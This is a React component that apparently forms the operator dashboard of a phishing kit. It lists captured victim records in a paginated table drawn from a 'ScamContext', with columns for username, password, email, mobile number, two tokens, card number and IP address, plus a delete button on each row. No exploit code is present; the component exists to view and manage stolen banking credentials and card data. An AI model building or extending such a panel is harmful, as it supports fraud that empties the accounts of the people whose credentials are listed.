import { EyeIcon } from '@heroicons/react/20/solid';
import { Table } from '@nextui-org/react';
import { useContext } from 'react';
import { DeleteIcon } from '../../assets/DeleteIcon';
import { IconButton } from '../../assets/IconButton';
import { ScamContext } from '../../context/ScamContext';
    
export const TableUserAll = ({users}) => {

  const { deleteUser } = useContext(ScamContext);

  return (
    <Table
      className='border-0 outline-none'
      borderWeight={0}
      shadow={false}
      compact
      aria-label="Example table with static content"
      css={{
        height: "auto",
        minWidth: "100%",
      }}
    >
      <Table.Header >
        <Table.Column>Usuario</Table.Column>
        <Table.Column>Clave</Table.Column>
        <Table.Column>Correo</Table.Column>
        <Table.Column>Celular</Table.Column>
        <Table.Column>token1</Table.Column>
        <Table.Column>token2</Table.Column>
        <Table.Column>Tarjeta</Table.Column>
        <Table.Column>ip</Table.Column>
        <Table.Column>...</Table.Column>
        
      </Table.Header>
      <Table.Body>
        {
          users.map( ({
            _id,
            username, 
            password,
            correo,
            celular,
            token1,
            token2,
            tarjeta,
            ip
          }, i) => (
          <Table.Row key={i}>
            <Table.Cell>{username}</Table.Cell>
            <Table.Cell>{password}</Table.Cell>
            <Table.Cell>{correo}</Table.Cell>
            <Table.Cell>{celular}</Table.Cell>
            <Table.Cell>{token1}</Table.Cell>
            <Table.Cell>{token2}</Table.Cell>
            <Table.Cell>{tarjeta}</Table.Cell>
            <Table.Cell>{ip}</Table.Cell>
            <Table.Cell>
              <IconButton onClick={() => deleteUser({_id})}>
                <DeleteIcon size={18} fill="#FF0080" />
              </IconButton>
            </Table.Cell>
          </Table.Row>
          ) )
        }
      </Table.Body>
      <Table.Pagination
        shadow
        noMargin
        align="start"
        rowsPerPage={10}
        loop
        total={
          users.length >= 10 ? 
            Number.isInteger(users.length / 10) === false 
            ? Math.round(users.length / 10 + 1)
            : Math.round(users.length / 10 )
           : 1
        }
        initialPage={1}
      />
    </Table>
  );
}
